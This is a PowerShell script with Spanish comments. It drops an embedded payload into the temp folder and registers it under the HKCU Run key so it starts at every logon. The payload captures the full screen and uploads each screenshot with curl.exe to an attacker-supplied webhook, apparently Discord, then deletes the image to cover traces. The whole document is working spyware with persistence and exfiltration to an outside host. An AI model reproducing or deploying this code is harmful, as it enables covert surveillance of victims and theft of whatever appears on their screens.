# Especifica el contenido del script que se descargará y ejecutará automáticamente
$autoDownloadScript = @"
# Script original
\$hookurl = "\$dc"
\$seconds = 30 # Screenshot interval
\$a = 1 # Sceenshot amount

# shortened URL Detection
if (\$hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; \$hookurl = (irm \$hookurl).url}

While (\$a -gt 0){
    \$Filett = "\$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    \$Width = \$Screen.Width
    \$Height = \$Screen.Height
    \$Left = \$Screen.Left
    \$Top = \$Screen.Top
    \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
    \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
    \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
    \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@\$filett" \$hookurl
    Start-Sleep 1
    Remove-Item -Path \$filett
    Start-Sleep \$seconds
    \$a--
}
"@

# Especifica la ubicación donde se guardará el script
$scriptPath = "$env:temp\script.ps1"

# Guarda el script en la ubicación especificada
Set-Content -Path $scriptPath -Value $autoDownloadScript

# Agrega una entrada al Registro de Windows para ejecutar el script al iniciar sesión del usuario
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "EjecutarScript"
$regValue = $scriptPath
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
